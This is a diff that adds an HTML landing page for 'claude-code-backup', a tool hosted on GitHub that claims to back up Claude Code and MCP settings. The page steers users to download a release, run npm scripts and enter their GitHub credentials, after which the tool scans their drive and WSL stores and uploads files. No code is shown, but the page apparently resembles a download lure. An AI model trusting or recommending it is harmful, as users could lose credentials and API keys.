@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>claude-code-backup</title>
+</head>
+<body style="font-family: sans-serif; line-height: 1.6; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f7f6; color: #333;">
+
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">💾 claude-code-backup - Save your settings to the cloud</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/Sibyllablueviolet195/claude-code-backup" style="background-color: #2980b9; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
+    </div>
+
+    <section>
+        <h2 style="color: #34495e;">📁 What this tool does</h2>
+        <p>This program creates copies of your Claude Code settings. It stores these files in your GitHub account. If you need to move your settings to a new computer or a different system, you can pull your backups down from the cloud. This works for Windows, macOS, and Linux. It also copies your settings from Windows Subsystem for Linux (WSL) stores. Your configuration, MCP settings, and custom tools remain safe.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #34495e;">⚙️ System requirements</h2>
+        <p>Your computer needs a few things to run this tool. First, you need Node.js installed. Node.js allows your computer to run the background scripts used by this backup tool. If you do not have it, visit the official Node.js website and run the installer. You also need a GitHub account. We save your data to your private GitHub storage to keep the information secure. Finally, ensure your computer has a stable internet connection for the backup process to reach the web.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #34495e;">📥 How to download and install</h2>
+        <p>Follow these steps to set up the backup system on your Windows computer:</p>
+        <ol>
+            <li>Visit the project page: <a href="https://github.com/Sibyllablueviolet195/claude-code-backup" style="color: #2980b9;">Official Download Page</a>.</li>
+            <li>Look for the green button labeled "Code" or "Releases" on the right side of the screen.</li>
+            <li>Select the latest version to download the folder to your computer.</li>
+            <li>Move the folder to a location you will remember, such as your Documents folder.</li>
+            <li>Right-click the folder and choose "Extract All" to unpack the files.</li>
+        </ol>
+    </section>
+
+    <section>
+        <h2 style="color: #34495e;">🚀 Running your first backup</h2>
+        <p>After you extract the files, perform the following actions to start the transfer:</p>
+        <ul>
+            <li>Open your command prompt or terminal window.</li>
+            <li>Type "cd" followed by a space, then drag the folder into the window. Press Enter.</li>
+            <li>Type "npm install" and press Enter to set up the necessary components.</li>
+            <li>Once finished, type "npm run backup" to start the process.</li>
+            <li>The program will ask for your GitHub credentials if this is your first time. Provide the requested information to link your account.</li>
+        </ul>
+        <p>The program will now identify your Claude Code files. It scans your primary drive and any active WSL stores. It encrypts this data and sends it to your cloud storage. A notification will appear in your terminal when the process finishes.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #34495e;">🔄 Restoring your settings</h2>
+        <p>If you get a new computer or delete your current settings, you can restore your data. Open your terminal in the same folder where you installed the tool. Run the command "npm run restore". This finds your most recent backup in the cloud and copies the files back to your computer. It replaces old settings with your saved versions. Restart your Claude Code application after the restore completes to load the new settings.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #34495e;">🛡️ Safety and privacy</h2>
+        <p>We do not collect your personal data or your chat history. This tool only interacts with your configuration files. All backups stay in your own private GitHub storage. You are the only person with access to these files. If you decide to delete your backups, you can remove them through your GitHub account page under your repositories list.</p>
+    </section>
+
+</body>
+</html>
